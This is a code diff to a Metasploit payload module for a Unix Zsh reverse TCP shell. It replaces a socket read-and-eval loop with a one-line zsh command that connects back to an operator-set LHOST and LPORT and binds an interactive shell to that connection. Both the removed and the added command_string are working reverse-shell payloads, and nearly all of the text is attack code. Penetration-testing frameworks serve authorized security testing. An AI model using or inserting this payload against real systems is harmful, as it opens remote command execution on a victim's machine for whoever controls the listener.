@@ -1,16 +1,15 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 110
+  CachedSize = 94
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -22,7 +21,11 @@ module MetasploitModule
         Connect back and create a command shell via Zsh.  Note: Although Zsh is often
         available, please be aware it isn't usually installed by default.
       },
-      'Author'      => 'Doug Prostko <dougtko[at]gmail.com>',
+      'Author'      =>
+        [
+          'Doug Prostko <dougtko[at]gmail.com>',    # Initial payload
+          'Wang Yihang <wangyihanger[at]gmail.com>' # Simplified redirections
+        ],
       'License'     => MSF_LICENSE,
       'Platform'    => 'unix',
       'Arch'        => ARCH_CMD,
@@ -35,14 +38,10 @@ module MetasploitModule
   end
 
   def generate
-    return super + command_string
+    super + command_string
   end
 
   def command_string
-    cmd = "zmodload zsh/net/tcp;"
-    cmd << "ztcp #{datastore['LHOST']} #{datastore['LPORT']};"
-    cmd << "while read -r cmd <&$REPLY;do eval ${cmd} >&$REPLY;done;"
-    cmd << "ztcp -c"
-    cmd
+    "zsh -c 'zmodload zsh/net/tcp && ztcp #{datastore['LHOST']} #{datastore['LPORT']} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
   end
 end
